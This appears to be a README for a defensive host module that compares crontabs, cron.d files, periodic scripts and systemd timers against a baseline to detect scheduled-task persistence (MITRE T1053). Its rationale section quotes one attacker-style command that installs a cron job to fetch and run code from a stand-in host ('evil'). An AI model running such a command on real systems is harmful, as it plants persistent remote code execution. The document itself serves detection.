# cron-job-watchdog

Daily delta of every scheduled-task surface on the host
against a learned baseline. A NEW scheduled job — cron
line, cron.d drop-in, or systemd timer — is the canonical
T1053 persistence indicator.

## Why this matters

Scheduled-task persistence (MITRE T1053) is one of the
most common ways an attacker survives reboot:
- `echo '* * * * * curl evil|sh' | crontab -` (user cron).
- Drop a file in `/etc/cron.d/` with a root job.
- Add a malicious systemd `.timer` + `.service` pair.
- Modify an existing periodic script in
  `/etc/cron.daily/`.

All of these create or change a file in a well-known
location. Hashing the full scheduled-task inventory daily
and diffing it catches the addition mechanically — even
if the live audit event (audit-rules watches these paths)
was missed or rotated out.

## Profiles

| Profile | Effect |
|---|---|
| `report` (default) | log delta; exit 0; operator-pull via journalctl |
| `enforce` | exit 1 on any ADDED/CHANGED job → systemd unit failed → notifier engine |

## Severity ladder

| Condition | Severity | Event |
|---|---|---|
| First scan (baseline) | `ok` | `baseline_initial` |
| No delta | `ok` | `no_delta` |
| 1–2 added/changed | `warn` | `new_job` |
| 3+ added/changed | `alert` | `mass_new_jobs` |

## Surfaces enumerated

| Surface | Path(s) |
|---|---|
| User crontabs | `/var/spool/cron/crontabs/*` (Debian) + `/var/spool/cron/*` (RHEL) |
| System crontab | `/etc/crontab` |
| cron.d | `/etc/cron.d/*` |
| Periodic dirs | `/etc/cron.{hourly,daily,weekly,monthly}/*` |
| systemd timers | enabled `*.timer` unit-file hashes (catches changed OnCalendar / ExecStart) |

Each entry is recorded as `source<TAB>path<TAB>sha256`, so
a CHANGED job (same path, new content) appears as an
add+remove pair — surfacing both that it changed and what
it was.

## Baseline file

`/var/lib/selfdef/cron-jobs-baseline.tsv` (mode 0600).
First scan creates it; operator re-baselines after
legitimately adding a job:
```bash
sudo rm /var/lib/selfdef/cron-jobs-baseline.tsv
sudo systemctl start selfdef-cron-jobs.service
```
Preserved across uninstall (forensic).

## Cadence

`*-*-* 05:45:00 ±10m` daily. Extends the detection ladder
(05:00 world-writable, 05:15 suid-sgid, 05:45 cron-jobs).

## MITRE coverage

- **T1053.003** Scheduled Task/Job: Cron — PRIMARY; new
  cron entries are the exact artifact.
- **T1053.006** Scheduled Task/Job: Systemd Timers —
  systemd `.timer` additions + ExecStart changes.
- **T1546** Event Triggered Execution — periodic scripts
  are an event-triggered exec primitive.
- **T1078** Valid Accounts — a per-user crontab added
  under a compromised account.

## Operator workflow

```bash
# Last scan summary
journalctl -t selfdef-cron-jobs -n 1 --no-pager

# Per-job detail (added/removed source + path)
journalctl -t selfdef-cron-jobs-detail --since "1 day ago"

# Manual inventory
for u in $(cut -d: -f1 /etc/passwd); do crontab -l -u "$u" 2>/dev/null && echo "  ^ $u"; done
ls -la /etc/cron.d/ /etc/cron.daily/
systemctl list-timers --all

# Investigate an added job
cat /etc/cron.d/<suspicious>
systemctl cat <suspicious>.timer

# Re-baseline after a legit addition
sudo rm /var/lib/selfdef/cron-jobs-baseline.tsv
sudo systemctl start selfdef-cron-jobs.service
```

## Caveats

- **Package installs add cron.d / timer entries** →
  fires `new_job` legitimately. Operator confirms + re-
  baselines after a package install wave.
- **Per-user crontab read** requires the scanner to read
  `/var/spool/cron/*`, which is root-readable — the
  systemd unit runs as root (ProtectSystem=strict +
  read-only home still allows the spool read).
- **Daily cadence** means a cron job added + removed
  within a day between scans may be missed. The job
  itself firing would still appear in auditd's exec
  watch (audit-rules) in that window.
- **Transient systemd timers** (run-time `systemd-run
  --on-calendar`) are recorded by name with a
  "transient" hash placeholder.

## Coexistence

- **audit-rules** (paranoid): watches cron/systemd-unit
  WRITES in real time; this module is the periodic
  baseline-delta backstop that catches what audit missed
  or what was rotated out of the audit log.
- **cron-baseline + at-disable**: those RESTRICT who can
  schedule; this DETECTS what got scheduled. Defense +
  detection pair.
- **suid-sgid-watchdog + listening-ports-watchdog**:
  sibling delta-detection modules (on-disk setuid /
  network listeners / scheduled tasks) — the three
  canonical persistence surfaces.
- **tetragon**: real-time exec eBPF can catch the cron
  job firing; this catches the job's INSTALLATION.
